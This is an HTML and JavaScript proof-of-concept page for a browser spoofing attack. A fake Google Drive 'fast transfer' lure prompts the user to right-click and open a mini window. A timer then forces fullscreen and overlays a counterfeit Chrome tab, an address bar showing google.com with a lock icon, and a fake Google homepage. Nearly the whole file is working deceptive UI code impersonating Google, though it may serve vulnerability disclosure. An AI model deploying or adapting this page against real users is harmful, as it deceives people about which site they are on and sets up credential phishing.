<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Drive - High Performance Mode</title>
    <style>
        :root {
            --chrome-bg: #f1f3f4;
            --chrome-url-bg: #ffffff;
            --chrome-border: #dadce0;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #ffffff;
            margin: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            overflow: hidden;
        }

        /* Initial Deceptive UI */
        #setup-ui {
            text-align: center;
            padding: 40px;
            max-width: 500px;
            border: 1px solid var(--chrome-border);
            border-radius: 12px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.05);
        }

        #setup-ui h1 { color: #1a73e8; font-weight: 400; }
        #setup-ui p { color: #5f6368; line-height: 1.6; }

        .btn {
            background-color: #1a73e8;
            color: white;
            padding: 12px 24px;
            text-decoration: none;
            border-radius: 8px;
            font-weight: 500;
            display: inline-block;
            margin-top: 20px;
            cursor: context-menu; /* Prompt right click */
        }

        /* Fullscreen Hijacking UI */
        #fullscreen-spoof {
            display: none; /* Shown only in fullscreen */
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background: #fff;
            z-index: 10000;
            flex-direction: column;
        }

        /* Fake Browser Header */
        .fake-header {
            background: var(--chrome-bg);
            border-bottom: 1px solid var(--chrome-border);
            padding: 8px 0;
            user-select: none;
        }

        .fake-tabs {
            height: 34px;
            display: flex;
            align-items: flex-end;
            padding-left: 8px;
        }

        .fake-tab {
            background: #fff;
            width: 200px;
            height: 28px;
            border-radius: 8px 8px 0 0;
            display: flex;
            align-items: center;
            padding: 0 12px;
            font-size: 12px;
            color: #3c4043;
            box-shadow: 0 -1px 2px rgba(0,0,0,0.05);
        }

        .fake-tab img { width: 16px; margin-right: 8px; }

        .fake-nav {
            background: #fff;
            height: 44px;
            display: flex;
            align-items: center;
            padding: 0 10px;
            gap: 12px;
        }

        .nav-icons { display: flex; gap: 16px; color: #5f6368; }

        .fake-omnibox {
            flex: 1;
            background: #f1f3f4;
            height: 28px;
            border-radius: 14px;
            display: flex;
            align-items: center;
            padding: 0 15px;
            font-size: 14px;
            color: #202124;
            border: 1px solid transparent;
            transition: background 0.2s;
        }

        .fake-omnibox:hover { background: #e8eaed; }
        
        .security-icon { color: #1e8e3e; margin-right: 8px; font-size: 12px; }

        .fake-url { flex: 1; white-space: nowrap; overflow: hidden; }

        /* Fake Content Area */
        .fake-content {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            background-color: #fff;
        }

        .google-logo { width: 272px; margin-bottom: 30px; }
        .search-bar {
            width: 584px;
            height: 44px;
            border: 1px solid #dfe1e5;
            border-radius: 24px;
            display: flex;
            align-items: center;
            padding: 0 20px;
            box-shadow: none;
            transition: box-shadow 0.2s;
        }
        .search-bar:hover { box-shadow: 0 1px 6px rgba(32,33,36,0.28); }
    </style>
</head>
<body>

    <div id="setup-ui">
        <svg width="48" height="48" viewBox="0 0 24 24" style="margin-bottom: 16px;">
            <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
            <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
            <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l3.66-2.84z"/>
            <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
        </svg>
        <h1>Google Drive Performance</h1>
        <p>To enable 10Gbps high-speed transfers, right-click the button below and select <b>"Open in Mini Window"</b> to link your dedicated session.</p>
        
        <a id="link" class="btn" href="https://drive.google.com">
            Activate Fast Transfer
        </a>
    </div>

    <!-- The Fullscreen Spoof Layer -->
    <div id="fullscreen-spoof">
        <div class="fake-header">
            <div class="fake-tabs">
                <div class="fake-tab">
                    <img src="https://www.google.com/favicon.ico" alt="">
                    Google
                </div>
            </div>
            <div class="fake-nav">
                <div class="nav-icons">
                    <span>←</span> <span>→</span> <span>↻</span>
                </div>
                <div class="fake-omnibox">
                    <span class="security-icon">🔒</span>
                    <span class="fake-url">https://www.google.com</span>
                </div>
            </div>
        </div>
        <div class="fake-content">
            <img class="google-logo" src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" alt="Google">
            <div class="search-bar">
                <span style="color: #9aa0a6; margin-right: 12px;">🔍</span>
                <span style="color: #202124;">Search Google or type a URL</span>
            </div>
            <div style="margin-top: 30px;">
                <button style="background: #f8f9fa; border: 1px solid #f8f9fa; padding: 10px 16px; border-radius: 4px; color: #3c4043; margin-right: 10px;">Google Search</button>
                <button style="background: #f8f9fa; border: 1px solid #f8f9fa; padding: 10px 16px; border-radius: 4px; color: #3c4043;">I'm Feeling Lucky</button>
            </div>
        </div>
    </div>

    <script>
        const link = document.getElementById('link');
        const spoofLayer = document.getElementById('fullscreen-spoof');

        // Logic for triggering the attack
        link.addEventListener('contextmenu', function() {
            console.log("[PoC] Context menu detected. Waiting for user to open Mini Window...");
            
            // Wait for user to click "Open in Mini Window", then trigger fullscreen
            setTimeout(async () => {
                try {
                    if (document.documentElement.requestFullscreen) {
                        await document.documentElement.requestFullscreen();
                    } else if (document.documentElement.webkitRequestFullscreen) {
                        await document.documentElement.webkitRequestFullscreen();
                    }
                } catch (e) {
                    console.error("[PoC] Fullscreen failed - likely blocked or user did not interact.", e);
                }
            }, 3500); // 3.5s delay to allow user to complete the right-click action
        });

        // Toggle spoof UI based on fullscreen state
        document.addEventListener('fullscreenchange', handleFs);
        document.addEventListener('webkitfullscreenchange', handleFs);

        function handleFs() {
            if (document.fullscreenElement || document.webkitFullscreenElement) {
                spoofLayer.style.display = 'flex';
                console.log("[PoC] HIJACK COMPLETE: Opener is fullscreen and spoofed.");
            } else {
                spoofLayer.style.display = 'none';
                console.log("[PoC] Exited Fullscreen.");
            }
        }
    </script>
</body>
</html>
